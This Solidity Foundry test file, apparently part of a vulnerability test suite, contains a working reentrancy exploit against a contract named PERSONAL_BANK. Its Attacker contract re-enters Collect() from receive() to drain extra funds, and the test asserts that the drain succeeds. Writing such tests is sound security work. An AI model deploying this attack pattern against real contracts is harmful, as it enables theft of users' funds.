
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {

    PERSONAL_BANK public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PERSONAL_BANK();
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _contractUnderTest.Deposit{value: attackVal}();

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialBalance;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victim = PERSONAL_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackValue = val;
    }

    function attack(uint256 val) public {
        initialBalance = address(this).balance;
        victim.Collect(val);
        exploitSucceeded = (address(this).balance > initialBalance);
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.Collect(attackValue);
            attackCallCount++;
        }
    }
}
